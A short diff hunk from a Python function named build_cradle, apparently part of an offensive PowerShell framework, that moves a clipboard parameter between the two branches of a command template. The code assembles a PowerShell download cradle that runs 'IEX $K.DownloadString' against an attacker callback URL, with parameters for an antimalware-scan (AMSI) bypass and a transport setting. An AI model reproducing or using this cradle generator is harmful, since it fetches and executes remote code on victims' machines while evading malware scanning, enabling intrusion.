@@ -137,13 +137,13 @@ def build_cradle(get_args):
             clip_exec = ""
         if get_args['SeparateAMSI'] == 'true':
             result += (
-                "'a=%(amsi)s','t=%(transport)s'|%%"
+                "'a=%(amsi)s','t=%(transport)s%(clip)s'|%%"
                 "{IEX $K.DownloadString('%(url)s0?'+$_)}"
             )
         else:
             result += (
-                "IEX $K.DownloadString('%(url)s0?t=%(transport)s&a=%(amsi)"
-                "s%(clip)s')"
+                "IEX $K.DownloadString('%(url)s0?t=%(transport)s&a=%(amsi)s"
+                "%(clip)s')"
             )
         result = result % dict(
             url=callback_urls[get_args['Transport']],
